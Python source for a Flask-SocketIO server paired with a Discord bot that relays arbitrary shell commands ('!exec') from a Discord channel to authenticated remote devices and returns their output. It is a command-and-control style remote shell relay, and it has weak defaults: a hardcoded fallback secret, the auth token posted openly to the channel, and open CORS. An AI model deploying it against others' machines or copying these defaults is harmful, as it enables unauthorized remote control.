import os
import asyncio
import threading
import time
import subprocess
from datetime import datetime
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import discord
from discord.ext import commands
import sys
if not hasattr(sys, 'modules'):
    sys.modules['audioop'] = None

DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN')
CHANNEL_ID = int(os.environ.get('CHANNEL_ID', 0))
SERVER_SECRET = os.environ.get('SERVER_SECRET', 'my_super_secret_key_12345')

if not DISCORD_TOKEN:
    print("❌ خطأ: DISCORD_TOKEN غير موجود")
    exit(1)

if not CHANNEL_ID:
    print("❌ خطأ: CHANNEL_ID غير موجود")
    exit(1)

print(f"✅ تم قراءة المتغيرات البيئية: CHANNEL_ID={CHANNEL_ID}")

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your_secret_key')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

connected_clients = {}      
client_responses = {}      
failed_attempts = {}        

@socketio.on('connect')
def handle_connect():
    print(f"[+] عميل متصل: {request.sid}")
    emit('request_auth', {'message': 'أرسل توكن المصادقة'})

@socketio.on('authenticate')
def handle_auth(data):
    token = data.get('token', '')
    name = data.get('name', 'Unknown')
    ip = request.remote_addr

    if token == SERVER_SECRET:
        connected_clients[name] = {
            'sid': request.sid,
            'ip': ip,
            'authenticated': True,
            'connected_at': datetime.now().isoformat()
        }
        print(f"[✅] جهاز جديد: {name} من {ip}")
        emit('auth_success', {'message': f'مرحباً {name}'})
        if ip in failed_attempts:
            del failed_attempts[ip]
    else:
        print(f"[❌] فشل مصادقة: {name} من {ip}")
        failed_attempts[ip] = failed_attempts.get(ip, 0) + 1
        if failed_attempts[ip] >= 5:
            emit('auth_failed', {'message': 'تم حظرك'})
            request.disconnect()
        else:
            emit('auth_failed', {'message': f'توكن خاطئ ({failed_attempts[ip]}/5)'})

@socketio.on('command_result')
def handle_result(data):
    name = data.get('client_name')
    if name not in connected_clients or not connected_clients[name]['authenticated']:
        return
    cmd_id = data.get('command_id')
    result = data.get('result')
    client_responses[cmd_id] = result
    print(f"[+] نتيجة من {name}")

@socketio.on('disconnect')
def handle_disconnect():
    for name, info in list(connected_clients.items()):
        if info['sid'] == request.sid:
            del connected_clients[name]
            print(f"[-] {name} غير متصل")
            break

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'[+] بوت متصل كـ {bot.user}')
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send("🖥️ **السيرفر جاهز للعمل!**")
        await channel.send(f"🔑 **توكن المصادقة:** `{SERVER_SECRET}`")
    else:
        print("❌ الشانل غير موجود! تأكد من CHANNEL_ID")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.channel.id != CHANNEL_ID:
        return

    content = message.content.strip()
    if not content:
        return

    if content.startswith('!exec'):
        parts = content.split(maxsplit=2)
        if len(parts) < 3:
            await message.channel.send("⚠️ استخدم: `!exec <جهاز> <أمر>`")
            return

        _, device, cmd = parts
        
        if device not in connected_clients:
            await message.channel.send(f"❌ الجهاز **{device}** غير متصل")
            return
        if not connected_clients[device]['authenticated']:
            await message.channel.send(f"❌ الجهاز **{device}** غير مصرح")
            return

        cmd_id = f"{device}_{datetime.now().timestamp()}"
        sid = connected_clients[device]['sid']
        
        try:
            socketio.emit('execute_command', {'command': cmd, 'command_id': cmd_id}, room=sid)
            await asyncio.sleep(30)
            result = client_responses.pop(cmd_id, "⏰ انتهت المهلة")
            if len(result) > 1900:
                result = result[:1900] + "\n... (مقطوع)"
            await message.channel.send(f"💻 **{device}** => `{cmd}`\n```\n{result}\n```")
        except Exception as e:
            await message.channel.send(f"❌ خطأ: {e}")

    elif content == '!list':
        if not connected_clients:
            await message.channel.send("❌ لا توجد أجهزة متصلة")
            return
        devices = "\n".join([f"- {name}" for name in connected_clients])
        await message.channel.send(f"📱 **الأجهزة المتصلة:**\n{devices}")

    elif content == '!help':
        help_text = """
**🤖 الأوامر المتاحة:**

`!list` - عرض الأجهزة المتصلة
`!exec <جهاز> <أمر>` - تنفيذ أمر على جهاز

**📝 أمثلة:**
`!exec laptop dir`
`!exec desktop ipconfig`

**🔑 ملاحظة:** البوت بحاجة إلى صلاحيات مدير لتنفيذ الأوامر
        """
        await message.channel.send(help_text)

    elif content == '!ping':
        await message.channel.send("🏓 Pong!")

@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'clients': len(connected_clients),
        'authenticated': sum(1 for c in connected_clients.values() if c['authenticated'])
    })

@app.route('/status')
def status():
    return jsonify({
        'clients': list(connected_clients.keys()),
        'total': len(connected_clients)
    })

if __name__ == '__main__':
    def run_bot():
        try:
            bot.run(DISCORD_TOKEN)
        except Exception as e:
            print(f"❌ خطأ في البوت: {e}")

    t = threading.Thread(target=run_bot, daemon=True)
    t.start()
    time.sleep(2)

    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
